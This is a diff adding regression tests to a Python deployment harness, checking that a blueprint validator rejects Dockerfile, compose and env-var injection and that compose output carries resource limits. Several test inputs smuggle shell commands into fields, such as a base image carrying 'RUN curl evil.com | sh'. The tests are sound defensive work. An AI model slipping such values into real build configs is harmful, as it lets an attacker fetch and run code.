@@ -1849,6 +1849,97 @@ class TestDeployPreviewGate:
         assert await deploy._prompt_deploy_approval("preview") is False
 
 
+class TestDeployValidation:
+    """Regression: blueprint identifiers used to interpolate raw into
+    Dockerfile/compose/Caddyfile, allowing injection via newline / `;`."""
+
+    def test_validator_accepts_clean_blueprint(self):
+        from harness.deploy import _validate_blueprint
+        bp = {
+            "services": {
+                "api": {
+                    "base_image": "python:3.12-slim",
+                    "ports": ["8080:8080"],
+                    "environment_keys_needed": ["DATABASE_URL", "PORT"],
+                    "depends_on_services": ["db"],
+                },
+                "db": {"base_image": "postgres:16-alpine"},
+            }
+        }
+        assert _validate_blueprint(bp) == []
+
+    def test_validator_rejects_newline_in_image(self):
+        from harness.deploy import _validate_blueprint
+        bp = {"services": {"api": {"base_image": "python:3.12\nRUN curl evil.com | sh"}}}
+        errors = _validate_blueprint(bp)
+        assert any("invalid base_image" in e for e in errors)
+
+    def test_validator_rejects_yaml_break_in_service_name(self):
+        from harness.deploy import _validate_blueprint
+        bp = {"services": {"api\n  evil:\n    image: bad": {"base_image": "ubuntu:22.04"}}}
+        errors = _validate_blueprint(bp)
+        assert any("invalid service name" in e for e in errors)
+
+    def test_validator_rejects_bad_env_var_name(self):
+        from harness.deploy import _validate_blueprint
+        bp = {"services": {"api": {
+            "base_image": "python:3.12",
+            "environment_keys_needed": ["KEY=VAL\nINJECTED"],
+        }}}
+        errors = _validate_blueprint(bp)
+        assert any("invalid env var name" in e for e in errors)
+
+    def test_validator_rejects_bad_port_mapping(self):
+        from harness.deploy import _validate_blueprint
+        bp = {"services": {"api": {
+            "base_image": "python:3.12",
+            "ports": ["8080; curl evil.com"],
+        }}}
+        errors = _validate_blueprint(bp)
+        assert any("invalid port mapping" in e for e in errors)
+
+    def test_generate_assets_refuses_bad_blueprint(self):
+        from harness.deploy import generate_assets_from_blueprint
+        with tempfile.TemporaryDirectory() as ws:
+            bp = {"services": {"api": {"base_image": "python:3.12\nRUN bad"}}}
+            result = generate_assets_from_blueprint(bp, {"languages": ["python"]}, ws)
+            assert result["success"] is False
+            assert "rejected by validator" in result["message"]
+            # No files were generated
+            assert "Dockerfile" not in os.listdir(ws)
+            assert "docker-compose.yml" not in os.listdir(ws)
+
+    def test_compose_includes_resource_limits(self):
+        from harness.deploy import _generate_compose_file
+        bp = {
+            "services": {
+                "api": {
+                    "base_image": "python:3.12-slim",
+                    "ports": ["8080:8080"],
+                },
+            }
+        }
+        compose = _generate_compose_file(bp)
+        assert "mem_limit:" in compose
+        assert "cpus:" in compose
+        assert "pids_limit:" in compose
+
+    def test_compose_respects_per_service_limit_override(self):
+        from harness.deploy import _generate_compose_file
+        bp = {
+            "services": {
+                "api": {
+                    "base_image": "python:3.12-slim",
+                    "limits": {"memory": "2g", "cpus": "2.0", "pids": 500},
+                }
+            }
+        }
+        compose = _generate_compose_file(bp)
+        assert "mem_limit: 2g" in compose
+        assert 'cpus: "2.0"' in compose
+        assert "pids_limit: 500" in compose
+
+
 class TestDeployBlueprint:
 
     def test_fallback_blueprint(self):
